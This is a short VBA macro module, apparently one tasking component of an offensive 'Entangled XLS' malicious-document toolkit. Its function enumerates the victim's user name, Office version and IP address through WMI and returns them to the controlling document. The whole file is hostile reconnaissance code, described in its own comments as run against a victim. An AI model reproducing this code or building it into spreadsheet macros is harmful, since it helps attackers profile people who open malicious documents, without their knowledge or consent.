'Author: Jake Krasnov
'Twitter: _Hubbl3
'Example tasking to be executed by the Entangled XLS document
'Enumerates the User Name, IP address and office product version of the victim 

Function ExecuteTask()
    Dim objWMI As Object
    
    results = "User: " & (Environ$("Username")) & vbCrLf
    results = results & "Version: " & Application.Version & vbCrLf
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    'Do wmi query requests to enumerate system proceses

    Set domain = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration")
    
    For Each objWMI In domain
        If Not IsNull(objWMI.IPAddress) Then
            results = results & "IP: " & objWMI.IPAddress(0)
            Exit For
        End If
            
    Next
    ExecuteTask = results
End Function
